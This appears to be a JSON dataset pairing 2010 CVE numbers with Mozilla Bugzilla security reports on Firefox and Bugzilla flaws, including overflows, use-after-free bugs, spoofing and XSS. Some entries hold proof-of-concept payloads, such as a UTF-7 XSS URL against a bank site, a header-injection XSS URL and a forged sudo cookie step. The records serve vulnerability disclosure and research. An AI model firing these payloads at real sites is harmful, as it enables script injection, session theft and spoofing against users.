        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=556957",
        "title": "Address bar spoofing possible via window.open() + HTTP 204 responses or window.stop()",
        "description": "Hi folks, A considerable number of large sites on the Internet have at least one write-only location that responds with HTTP 204 (\"No content\") when queried directly. Unfortunately, Firefox seems to handle 204 responses in a weird way, in some cases displaying the new URL in the URL bar, but keeping the old document in place. Specifically, consider this example: -- snip! -- <html> <input type=submit value=\"Click me now\" onclick=\"clicked()\"> <script> var w; function clicked() { w = window.open(\"https://www.google.com/csi\",\"_blank\"); setTimeout('w.document.body.innerHTML = \"I am not https://www.google.com at all!\"', 500); } </script> -- snip! -- This, obviously, looks pretty bad."
      }
    ],
    "CVE-2010-2455": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=556957",
        "title": "Address bar spoofing possible via window.open() + HTTP 204 responses or window.stop()",
        "description": "Hi folks, A considerable number of large sites on the Internet have at least one write-only location that responds with HTTP 204 (\"No content\") when queried directly. Unfortunately, Firefox seems to handle 204 responses in a weird way, in some cases displaying the new URL in the URL bar, but keeping the old document in place. Specifically, consider this example: -- snip! -- <html> <input type=submit value=\"Click me now\" onclick=\"clicked()\"> <script> var w; function clicked() { w = window.open(\"https://www.google.com/csi\",\"_blank\"); setTimeout('w.document.body.innerHTML = \"I am not https://www.google.com at all!\"', 500); } </script> -- snip! -- This, obviously, looks pretty bad."
      }
    ],
    "CVE-2010-2470": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=561797",
        "title": "[SECURITY] checksetup.pl with $use_suexec=1 sets localconfig as world readable",
        "description": "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.9.1.9) Gecko/20100330 Fedora/3.5.9-2.fc12 Firefox/3.5.9 Build Identifier: 3.6 localconfig is set as world readable (0644) by checksetup.pl's \"fixing permissions\" section if $suexec is enabled. Reproducible: Always Steps to Reproduce: 1. Extract bugzilla 3.6 2. Run ./checksetup.pl to generate localconfig 3. Edit localconfig setting suexec=1 (and other necessary details) 4. Run ./checksetup.pl again Actual Results: $ ls -l localconfig -rw-r--r-- 1 bugzilla bugzilla 5638 2010-04-26 03:33 localconfig Expected Results: $ ls -l localconfig -rw-r----- 1 bugzilla bugzilla 5638 2010-04-26 03:33 localconfig Although the webserver is stopped from serving localconfig via .htaccess (if $create_htaccess = 1) this will not stop other users with shell access gaining the database password."
      }
    ],
    "CVE-2010-2751": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=536466",
        "title": "SSL spoofing using location.href and location.reload() with history.back() and history.forward()",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 When you enter an address with an automatic redirection enabled on an other adress (with SSL certificat) , enter again the same adress( with redirection disabled) , actualize again the same page (with automatic redirection enabled), history.back() & history.forward(). Reproducible: Always Steps to Reproduce: Step 1=> enter an adress with an automatic redirection on an https website with SSL cetificat Step 2=> reopen the same adress but this time with redirection disabled Step 3=> actualize (the redirection must be re-enabled automaticatly) Step 4=> Go back & forward or Step 1=> Create an html file PoC with a special javascript and an other file with an activation/desactivation of the automatic rediction faith on two Step 2=> Open the page Actual Results: The adress (with redirection enabled/disabled) takes content and SSL certificat of the HTTPS website"
      }
    ],
    "CVE-2010-2752": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=574059",
        "title": "nsCSSValue::Array index integer overflow (can lead to remote code execution via CSS font-face) (ZDI-CAN-831)",
        "description": "ZDI-CAN-831: Mozilla Firefox CSS font-face Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within handling of references to external font resources. A value is used as a 16 bit integer in an array allocation and later as 32 bit when iterating over and then populating these fields. By creating enough references, a remote attacker can exploit this vulnerability to execute arbitrary code under the context of the browser. Version(s) tested: 00400000 004e0000 firefox (deferred) Image path: C:\\Program Files\\Mozilla Firefox\\firefox.exe Image name: firefox.exe Timestamp: Thu Apr 01 10:38:42 2010 (4BB4BE02) CheckSum: 000EA924 ImageSize: 000E0000 File version: 1.9.2.3743 Product version: 3.6.3.0 Platform(s) tested: Windows XP SP3 x86 http://mxr.mozilla.org/mozilla1.9.2/source/layout/style/nsCSSParser.cpp#7893 // alloc: 7892 nsRefPtr<nsCSSValue::Array> srcVals 7893 = nsCSSValue::Array::Create(values.Length()); // overflow: 7899 PRUint32 i; 7900 for (i = 0; i < values.Length(); i++) 7901 srcVals->Item(i) = values[i]; -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * J23 (http://twitter.com/HansJ23)"
      }
    ],
    "CVE-2010-2753": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=571106",
        "title": "nsTreeSelection Dangling Pointer Remote Code Execution Vulnerability (ZDI-CAN-755)",
        "description": "ZDI-CAN-755: Mozilla Firefox nsTreeSelection Dangling Pointer Remote Code Execution Vulnerability -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The specific flaw exists within the implementation of XUL <tree> element's \"selection\" attribute. There is an integer overflow when calculating the bounds of a new selection range. When calling adjustSelection on this manged range both ranges are deleted leaving a dangling reference. A remote attacker can exploit this vulnerability to execute arbitrary code under the context of the browser. View of XUL <tree> element exposes \"selection\" attribute. This in turn allows user to precisely choose set of tree's rows to be shown as selected. The way class nsTreeSelection (layout/xul/base/src/tree/src/nsTreeSelection.cpp) is implemented is quite interesting: with a linked list of nsTreeRange instances where nsTreeRange represents single continuous range of selected rows (and possibly a pointer to the next range). nsTreeSelection holds directly only one pointer, to the first range, mFirstRange. What is also important to note: whenever any nsTreeRange instance is deleted, delete (inside destructor) is called recursively on the next linked instances as well. Imagine we have the following piece of Javascript code: [1] sel = tree.treeBoxObject.view.selection; [2] sel.rangedSelect(0, 0x7fffffff, true); [3] sel.adjustSelection(1, 1); At [1] we grab the reference to selection object. At this moment mFirstRange is null, no row is selected, so there is no need for any range to keep track of. Then [2] we call method rangedSelect(). From nsTreeSelection::RangedSelect(): ... PRInt32 start = aStartIndex < aEndIndex ? aStartIndex : aEndIndex; PRInt32 end = aStartIndex < aEndIndex ? aEndIndex : aStartIndex; ... nsTreeRange* range = new nsTreeRange(this, start, end); if (!range) return NS_ERROR_OUT_OF_MEMORY; range->Invalidate(); if (aAugment && mFirstRange) mFirstRange->Insert(range); else mFirstRange = range; ... That makes mFirstRange being set to range <0, 2G>, or more precisely (yet in ad hoc pseudo code): mFirstRange = { min: 0, max: 2G, prev: null, next: null } And at [3] we hit integer overflow that causes a lot of trouble. From nsTreeSelection::AdjustSelection(PRInt32 aIndex, PRInt32 aCount): ... nsTreeRange* newRange = nsnull; PRBool selChanged = PR_FALSE; nsTreeRange* curr = mFirstRange; while (curr) { if (aCount > 0) { // inserting if (aIndex > curr->mMax) { ... } else if (aIndex <= curr->mMin) { ... } else { // adjustment happen inside the range. // break apart the range and create two ranges ADD_NEW_RANGE(newRange, this, curr->mMin, aIndex - 1); ADD_NEW_RANGE(newRange, this, aIndex + aCount, curr->mMax + aCount); selChanged = PR_TRUE; } } else { ... } curr = curr->mNext; } delete mFirstRange; mFirstRange = newRange; ... As we are calling AdjustSelection(1, 1), two ADD_NEW_RANGE() are executed. This means that something like <0, 0>.Insert(<2, -2G>) will be called. Notice that because of integer overflow lower bound (2) is above higher bound (-2G). void Insert(nsTreeRange* aRange) { if (mMin >= aRange->mMax) aRange->Connect(mPrev, this); else if (mNext) mNext->Insert(aRange); else aRange->Connect(this, nsnull); } So, now <2, -2G>.Connect(mPrev = null, <0, 0>): void Connect(nsTreeRange* aPrev = nsnull, nsTreeRange* aNext = nsnull) { if (aPrev) aPrev->mNext = this; else mSelection->mFirstRange = this; if (aNext) aNext->mPrev = this; mPrev = aPrev; mNext = aNext; } Which results in: mFirstRange = { min: 2, max: -2G, prev: null, next: { min: 0, max: 0, prev: mFirstRange, next: null } } But we can not forget about the epilogue of AdjustSelection(): delete mFirstRange; mFirstRange = newRange; Final result: both ranges (<2, -2G>, <0, 0>) are deleted and mFirstRange points at deleted range <0, 0>. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-2754": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=568564",
        "title": "Suppress the script filename for cross-origin error events (SA39925)",
        "description": "See http://secunia.com/advisories/39925"
      }
    ],
    "CVE-2010-2755": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=575836",
        "title": "free() of garbage values when an <object> has a |data=\"\"| attribute and no \"src\" attribute --> crash [@ free | nsPluginInstanceOwner::~nsPluginInstanceOwner() ]",
        "description": "OS: Ubuntu Maverick (10.10) pre-release STR: 1. Load URL http://itunes.apple.com/us/podcast/the-bugle-audio-newspaper/id265799883 ACTUAL RESULTS: Immediate crash in opt build; shutdown crash in debug build. NOTE: This doesn't affect my other machine running an earlier Ubuntu version (10.04). On the broken machine, if I disable the \"QuickTime Plug-in 7.6.6\" in about:addons, it fixes the problem. (Note: this plugin's subtitle shows that it's actually handled by \"The Totem 2.30.2 plugin\", since this is Linux and there's no _actual_ Quicktime support) So, this is probably due to a totem bug, but I'm filing here because it crashes Firefox and I'd hope that OOPP would prevent that. Firefox version: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:2.0b2pre) Gecko/20100629 Minefield/4.0b2pre TOTEM PLUGIN VERSIONS: Working Ubuntu 10.04 box: 2.30.2-0ubuntu1 Broken Ubuntu 10.10 box: 2.30.2-2ubuntu2"
      }
    ],
    "CVE-2010-2756": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=417048",
        "title": "[SECURITY] Boolean charts let me query for users being in any given group",
        "description": "\"ReportedBy\" \"is equals to\" \"%group.admin%\" returns all bugs where the reporter is in the admin group, despite I'm not in the admin group and despite I cannot access editusers.cgi (as I cannot bless anybody). AFAIK, such data should be restricted to power users who can access editusers.cgi. Moreover, query.cgi throws an error if I type a group name which doesn't exist, so I can use this trick to guess existing groups. IMO, query.cgi should only let you enter group names you belong to, nothing more. Talking about this with dveditz and justdave on IRC, they both think it's not a problem on b.m.o, because they don't matter if people know who is in which group, but it may matter for some other installations, which is why I restricting this bug to the security group. The %group.foo% group substitution feature has been implemented in Bugzilla 2.20 in bug 244239, so this problem exists for a long time."
      }
    ],
    "CVE-2010-2757": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=450013",
        "title": "[SECURITY] Can sudo a user without sending email",
        "description": "The cookie for sudo is the userid. 1. Find out user's id (some queries with debug=1 will expose this) 2. Add cookie 'sudo=<id>' 3. Visit bugzilla site Actual: Have sudoed user Expected: Fails. This needs to use a cookie from the token table (that verifies the (originaluser, targetuser) tuple, or something similar. You need to have privileges to sudo, so its not a permissions exploit, but its still not good....."
      }
    ],
    "CVE-2010-2758": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=577139",
        "title": "[SECURITY] request.cgi and duplicates.cgi let you know whether a product exists or not",
        "description": "Bugzilla::Product::check_product() throws an error if you pass a product name which doesn't exist, letting the user know whether it's a valid product name or not. This is going to be fixed in Bugzilla 4.2 as part of bug 519835."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=519835",
        "title": "Bugzilla::Product::check_product() should be Bugzilla::Product->check()",
        "description": "check_product() in Product.pm existed before Object.pm. We should now replace it by Object->check()."
      }
    ],
    "CVE-2010-2759": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=583690",
        "title": "[SECURITY][PostgreSQL] Bugzilla crashes when viewing a bug if a comment contains 'bug <num>' or 'attachment <num>' where <num> is greater than the max allowed integer",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729) Build Identifier: 3.6.1 Crash with error 'value \"4294967296\" is out of range for type integer ' when I type 'bug 4294967296' in comments for bug. Database server is PostgreSQL 8.3.7 Bugzilla version 3.6.1 Reproducible: Always Steps to Reproduce: 1. Open any existing bug 2. Enter 'bug 4294967296' in comment 3. Save changes Actual Results: undef error - DBD::Pg::db selectrow_hashref failed: ERROR: value \"4294967296\" is out of range for type integer [for Statement \" SELECT alias,assigned_to,bug_file_loc,bug_id,bug_severity,bug_status,cclist_accessible,component_id,delta_ts,estimated_time,everconfirmed,op_sys,priority,product_id,qa_contact,remaining_time,rep_platform,reporter_accessible,resolution,short_desc,status_whiteboard,target_milestone,version,reporter AS reporter_id,TO_CHAR(creation_ts, 'YYYY.MM.DD HH24:MI') AS creation_ts,TO_CHAR(deadline, 'YYYY-MM-DD') AS deadline FROM bugs WHERE bug_id = ?\"] at Bugzilla/Object.pm line 85 Bugzilla::Object::_init('Bugzilla::Bug', 4294967296) called at Bugzilla/Object.pm line 53 Bugzilla::Object::new('Bugzilla::Bug', 4294967296) called at Bugzilla/Bug.pm line 294 Bugzilla::Bug::new('undef', 4294967296) called at Bugzilla/Template.pm line 326 Bugzilla::Template::get_bug_link('undef', 'undef', 'HASH(0x973b1f4)') called at Bugzilla/Template.pm line 245 Bugzilla::Template::quoteUrls('bug 4294967296', 'Bugzilla::Bug=HASH(0x915426c)', 'Bugzilla::Comment=HASH(0x94cdab4)') called at Bugzilla/Template.pm line 562 Bugzilla::Template::__ANON__('bug 4294967296') called at template/en/default/bug/comments.html.tmpl line 241 eval {...} called at template/en/default/bug/comments.html.tmpl line 175 Template::Provider::__ANON__('Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Context.pm line 348 eval {...} called at lib/i386-freebsd-64int/Template/Context.pm line 321 Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'a_comment') called at Bugzilla/Template/Context.pm line 45 Bugzilla::Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'a_comment') called at template/en/default/bug/comments.html.tmpl line 130 eval {...} called at template/en/default/bug/comments.html.tmpl line 136 eval {...} called at template/en/default/bug/comments.html.tmpl line 18 Template::Provider::__ANON__('Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Document.pm line 151 eval {...} called at lib/i386-freebsd-64int/Template/Document.pm line 149 Template::Document::process('Template::Document=HASH(0x972e548)', 'Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Context.pm line 351 eval {...} called at lib/i386-freebsd-64int/Template/Context.pm line 321 Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'bug/comments.html.tmpl', 'HASH(0x971a910)') called at Bugzilla/Template/Context.pm line 45 Bugzilla::Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'bug/comments.html.tmpl', 'HASH(0x971a910)') called at template/en/default/bug/edit.html.tmpl line 238 eval {...} called at template/en/default/bug/edit.html.tmpl line 18 Template::Provider::__ANON__('Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Document.pm line 151 eval {...} called at lib/i386-freebsd-64int/Template/Document.pm line 149 Template::Document::process('Template::Document=HASH(0x94b3fcc)', 'Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Context.pm line 351 eval {...} called at lib/i386-freebsd-64int/Template/Context.pm line 321 Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'bug/edit.html.tmpl') called at Bugzilla/Template/Context.pm line 45 Bugzilla::Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'bug/edit.html.tmpl') called at template/en/default/bug/show.html.tmpl line 45 eval {...} called at template/en/default/bug/show.html.tmpl line 18 Template::Provider::__ANON__('Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Document.pm line 151 eval {...} called at lib/i386-freebsd-64int/Template/Document.pm line 149 Template::Document::process('Template::Document=HASH(0x92a9544)', 'Bugzilla::Template::Context=HASH(0x8f6fcfc)') called at lib/i386-freebsd-64int/Template/Context.pm line 351 eval {...} called at lib/i386-freebsd-64int/Template/Context.pm line 321 Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'Template::Document=HASH(0x92a9544)') called at Bugzilla/Template/Context.pm line 45 Bugzilla::Template::Context::process('Bugzilla::Template::Context=HASH(0x8f6fcfc)', 'Template::Document=HASH(0x92a9544)') called at lib/i386-freebsd-64int/Template/Service.pm line 94 eval {...} called at lib/i386-freebsd-64int/Template/Service.pm line 91 Template::Service::process('Template::Service=HASH(0x8ef5f7c)', 'bug/show.html.tmpl', 'HASH(0x804d16c)') called at lib/i386-freebsd-64int/Template.pm line 66 Template::process('Bugzilla::Template=HASH(0x8e6f028)', 'bug/show.html.tmpl', 'HASH(0x804d16c)') called at /usr/local/www/bugzilla/show_bug.cgi line 128"
      }
    ],
    "CVE-2010-2760": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=585815",
        "title": "Possible unfixed nsTreeSelection dangling pointer issues from bug 571106 (ZDI-CAN-903)",
        "description": "ZDI just notified us that the researcher who reported ZDI-10-131 (Mozilla Firefox nsTreeSelection Dangling Pointer Remote Code Execution Vulnerability), also known as bug 571106, has reported that the vulnerability is still an issue even though a patch was released. Need to make sure that the entirety of the researcher's original report has been fixed and not just what the PoC may be showing. I will follow-up with ZDI to see if there is a better testcase for the issue. Since I accidentally submitted bug 571106, comment #0 with extra blank lines, I will repaste the original report in the next comment."
      }
    ],
    "CVE-2010-2761": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=600464",
        "title": "[SECURITY] Content/Header injection due to non-random multipart/x-mixed-replace boundary",
        "description": "Search result of b.m.o. does not escape \"--------- =_aaaaaaaaaa0\": it is used as boudary of multipart/x-mixed-replace. Attackers can inject boundary of multipart/x-mixed-replace. It may be able to be used for HTTP Header injection. Example: https://bugzilla.mozilla.org/buglist.cgi?query_format=advanced&short_desc=---------%20%3D_aaaaaaaaaa0&short_desc_type=allwordssubstr&resolution=---&resolution=DUPLICATE"
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=591165",
        "title": "[SECURITY] Header injection, cross-site scripting in report.cgi",
        "description": "Hi folks, While doing something completely unrelated, I noticed that the query_format parameter passed to report.cgi is not properly sanitized when quoted in the \"Location\" header in the response. This allows malicious headers or HTML body to be injected in order to steal cookies, poison reverse caches, etc. Proof-of-concept against bugzilla.mozilla.org (works in Firefox): https://bugzilla.mozilla.org/report.cgi?x_axis_field=1&y_axis_field=1&z_axis_field=1&query_format=report-tablebogus%0a%0dC<html><script>alert(1)</script>:%20s%0a%0a%0a%0aFOO&short_desc_type=jellyfish&short_desc=jellyfish&product=1&component=1&version=1&long_desc_type=jellyfish&long_desc=jellyfish&bug_file_loc_type=1&bug_file_loc=1&bug_status=1&resolution=1&bug_severity=1&priority=1&rep_platform=1&op_sys=1&emailassigned_to1=on&emailreporter1=on&emailcc1=on&emaillongdesc1=on&emailtype1=skipfish@example.com&email1=skipfish@example.com&emailassigned_to2=on&emailreporter2=on&emailcc2=on&emaillongdesc2=on&emailtype2=skipfish@example.com&email2=skipfish@example.com&bugidtype=1&bug_id=1&votes=1&chfieldfrom=1&chfieldto=Now&chfield=1&chfieldvalue=1&format=table&action=wrap&negate0=on&field0-0-0=1&type0-0-0=1&value0-0-0=1&cmd-add0-0-1=Or&cmd-add0-1-0=And&cmd-add1-0-0=Add%20another%20boolean%20chart"
      }
    ],
    "CVE-2010-2762": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=584180",
        "title": "SJOWs create scope chains ending in outer objects",
        "description": "A SJOW around an outer window creates a scope function parented directly to the outer window's global object, which is... the outer window. I don't know if this is exploitable, but it's definitely hitting us on bug 581539, because window.postMessage indirectly depends on the scope chain ending in an inner object."
      }
    ],
    "CVE-2010-2763": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=585284",
        "title": "XSS using SJOW's scripted function",
        "description": "1.9.1 branch has a similar problem to bug 584180. On 1.9.1, SJOW creates a scripted function that can be abused. If a scripted function's parent is an outer window, an array that is created in that function comes from a current inner window."
      }
    ],
    "CVE-2010-2764": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=552090",
        "title": "XHR Cross Site Status leak from xhr.statusText",
        "description": "User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 Build Identifier: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8 content/base/src/nsXMLHttpRequest.cpp GetStatus() checks for a leak of status information from denied cross-site requests but GetStatusText() does not nsXMLHttpRequest::GetStatus(PRUint32 *aStatus) { *aStatus = 0; if (mState & XML_HTTP_REQUEST_USE_XSITE_AC) { // Make sure we don't leak status information from denied cross-site // requests. if (mChannel) { nsresult status; mChannel->GetStatus(&status); if (NS_FAILED(status)) { return NS_OK; } } } nsXMLHttpRequest::GetStatusText(nsACString& aStatusText) { nsCOMPtr<nsIHttpChannel> httpChannel = GetCurrentHttpChannel(); aStatusText.Truncate(); nsresult rv = NS_OK; if (httpChannel) { rv = httpChannel->GetResponseStatusText(aStatusText); } return rv; } Reproducible: Always"
      }
    ],
    "CVE-2010-2765": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=576447",
        "title": "FRAMESET integer overflow via new operator in nsHTMLFrameSetElement::ParseRowCol()",
        "description": "Chris@Matasano.com reported the following integer overflow vulnerability to security@: ============================================================================== FRAMESET integer overflow in new operator on line 332 of nsHTMLFrameSetElement.cpp A FRAMESET tag looks like this: < FRAMESET cols=\"%20,%80\" > When a call to setAttribute occurs on the FRAMESET element we reach the following function on line 332 of nsHTMLFrameSetElement.cpp: nsresult nsHTMLFrameSetElement::ParseRowCol(const nsAString & aValue, PRInt32& aNumSpecs, nsFramesetSpec** aSpecs) { ... // Count the commas PRInt32 commaX = spec.FindChar(sComma); PRInt32 count = 1; while (commaX != kNotFound) { count++; commaX = spec.FindChar(sComma, commaX + 1); } nsFramesetSpec* specs = new nsFramesetSpec[count]; ... nsHTMLFrameSetElement::ParseRowCol counts the number of commas in the tag and then allocates a heap buffer using that number with the new operator. The size of the nsFramesetSpec structure is 8 bytes, so we need 536870912 or more commas to trigger the integer overflow. When this happens, too small of an allocation occurs and the proceeding heap memory is overwritten in the for loop on line 347. Here is the crash dump from WinDBG: 0:000> r eax=ffffffff ebx=00000000 ecx=00000000 edx=0000002c esi=001f0004 edi=00000000 eip=5e560c97 esp=001ee984 ebp=001eea78 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 xul!nsHTMLFrameSetElement::ParseRowCol+0xaf: 5e560c97 8366fc00 and dword ptr [esi-4],0 ds:0023:001f0000=00905a4d There is one mitigating factor, as you will see when you push the button below. The script requires such an enormous allocation of commas that FF will ask the user several times if the script should be allowed to continue or not. Exploiting this bug in a 32bit Firefox process might be difficult as the commas take up most of the available heap memory. But a 64bit process is a different story. Fixing this vulnerability is relatively straight forward. Define a max number of commas and check count within the while loop to see if it has reached that threshold. If it has, exit the while loop. Alternatively checking for integer overflow before the new operator is called is also suggested."
      }
    ],
    "CVE-2010-2766": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=580445",
        "title": "normalizeDocument Remote Code Execution Vulnerability (ZDI-CAN-866)",
        "description": "ZDI-CAN-866: Mozilla Firefox normalizeDocument Remote Code Execution Vulnerability -- CVSS ---------------------------------------------------------------- 10, (AV:N/AC:L/Au:N/C:C/I:C/A:C) -- ABSTRACT ------------------------------------------------------------ TippingPoint has identified a vulnerability affecting the following products: Mozilla Firefox 3.6.x -- VULNERABILITY DETAILS ----------------------------------------------- This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Mozilla Firefox. User interaction is required to exploit this vulnerability in that the target must visit a malicious page or open a malicious file. The flaw exists within the normalizeDocument function defined within nsDocument.cpp. When handling children nodes the code does not account for a varying number of children during normalization. An attacker can abuse this problem along with the fact that the code does not validate the child index is within bounds to access an invalid object and execute arbitrary code under the context of the browser. From content/base/src/nsDocument.cpp: nsDocument::Normalize() { PRInt32 count = mChildren.ChildCount(); for (PRInt32 i = 0; i < count; ++i) { nsCOMPtr<nsIDOMNode> node(do_QueryInterface(mChildren.ChildAt(i))); if (node) { node->Normalize(); } } return NS_OK; } There are two problems in the code above: 1. Number of root's children can change during normalization. Thus fetching mChildren.ChildCount() at the very beginning is incorrect. 2. mChildren.ChildAt() is not a fail-safe method, i.e. it does not check if index argument is within children array bounds. Attacker can create HTML document with some additional nodes after HTML body and then remove them during initial steps of normalization process. This directly leads to arbitrary code execution. -- CREDIT -------------------------------------------------------------- This vulnerability was discovered by: * regenrecht"
      }
    ],
    "CVE-2010-2767": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=584512",
        "title": "nsPluginArray - memory corruption",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) Chrome/6.0.472.14 Safari/534.3 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 Looks like it's a use-after-free issue. I think the testcase is self-explaining although it's quite weak - it takes a lot of time to trigger the crash. Reproducible: Always http://crash-stats.mozilla.com/report/index/4b3b731c-511c-484c-a13f-ff27b2100804 Also crashes 4.0b2."
      }
    ],
    "CVE-2010-2768": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=579744",
        "title": "UTF-7 Universal XSS by overriding document charset using <object> type attribute",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4 Build Identifier: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 ( .NET CLR 3.5.30729) In Firefox, the \"type\" attribute of an <object> tag can override the charset of a framed HTML document, even if the document is included across origins. The charset specified in the \"type\" attribute overrides any charset of the document that is specified using <?xml encoding=\"utf-8\"?>, <meta charset=\"utf-8\">, or <meta http-equiv=\"Content-Type\" value=\"text/html;charset=utf-8\">. This allows an attacker to bypass server XSS filtering of angle brackets and inject arbitrary JavaScript code encoded in UTF-7 into web sites. It works on web sites that do not specify a charset in the Content-Type header (416 out of the Alexa top 1000). It does not work on web sites that specify a charset in the Content-Type header (584 out of the Alexa top 1000). Reproducible: Always Steps to Reproduce: Here's a proof of concept exploit, using bankofthewest.com as an example: <object type=\"text/html; charset=UTF-7\" data=\"https://srch01.bankofthewest.com/search?q=%2BACI-%2BAD4-%2BADw-script%2BAD4-alert(document.location)%2BADw-/script%2BAD4-\"></object> Actual Results: Bank of the West attempts to set the charset using a meta tag, but Firefox ignores it and parses the response document as UTF-7. The exploit is successful. Expected Results: Firefox should not let the \"type\" attribute of a cross-origin <object> tag influence the charset of the rendered object. See also: bug 356280, bug 406777, bug 408457, bug 530647, bug 414064"
      }
    ],
    "CVE-2010-2769": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=520189",
        "title": "Copy-and-paste or drag-and-drop into designMode document allows XSS",
        "description": "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729) Build Identifier: An IFRAME with its src attribute set to a data URI can be dragged into a designMode area. The data URI renders an HTML link that, if clicked, will execute some JavaScript. If a selection containing such an IFRAME is dragged between two different domains, the JavaScript will execute in the context of the domain where it is dropped. If an attacker can get a user to perform a drag and drop operation, it is possible to perform XSS on sites that use the designMode feature. Webkit and Internet Explorer are affected by similar bugs, which I have reported in the relevant places. Reproducible: Always Steps to Reproduce: See testcase"
      }
    ],
    "CVE-2010-2770": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=583520",
        "title": "Mac crash with fuzzed font in data: URL",
        "description": "Marc Schoenefeld reported the following to security@mozilla.org. I confirmed that it crashed for me on Firefox 3.6.8, but NOT on trunk. I died before Crash Reporter came up, but I saved the relevant portion of the Apple crash report, which I'll attach. Crash Wrangler told Marc that it was a double free issue, but I can't tell if that's consistent with what I got. sg:crit? until we know for sure. ---------- Hi, my font fuzzer triggered the following on Ffx 3.6.8/OSX10.6 The testcase is attached as html file embedding the malformed font in a data: url tag. The Crashwrangler wrapped said it is exploitable, so I thought I better forward this. Summary from CW: Faulty glyph (id:38) outline detected - replacing with a space/null glyph - in memory font kind Fri Jul 30 12:20:24 maeckes2.local firefox-bin[10483] <Error>: CGBitmapContextInfoCreate: unable to allocate 10584 bytes for bitmap data objc[10483]: FREED(id): message autorelease sent to freed object=0x1f2de010 [..] --- 